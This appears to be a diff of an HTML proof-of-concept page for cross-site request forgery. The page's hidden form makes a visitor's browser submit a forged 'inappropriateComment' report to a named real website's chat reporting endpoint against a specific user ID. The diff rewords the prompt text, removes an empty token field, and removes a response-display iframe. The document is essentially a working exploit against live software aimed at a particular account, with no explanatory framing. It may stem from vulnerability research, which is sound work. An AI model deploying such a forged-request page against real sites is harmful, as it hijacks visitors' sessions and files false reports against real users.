@@ -2,25 +2,17 @@
 <html>
   <body>
     <h2>CSRF Proof of Concept</h2>
-    <p>Click the button below to send a forged report request:</p>
+    <p>Click the button below to submit the forged report request:</p>
 
     <form id="csrfForm"
           action="https://www.mydirtyhobby.com/chat/reportcontent"
           method="POST"
-          enctype="multipart/form-data"
-          target="csrfTarget">
+          enctype="multipart/form-data">
 
       <input type="hidden" name="reason" value="inappropriateComment">
       <input type="hidden" name="userId" value="114253502">
-      <input type="hidden" name="jwt" value="">
 
       <button type="submit">Submit CSRF Request</button>
     </form>
-
-    <h3>Server Response:</h3>
-    <iframe name="csrfTarget"
-            style="width: 100%; height: 200px; border: 1px solid #ccc;"
-            id="csrfTarget">
-    </iframe>
   </body>
 </html>
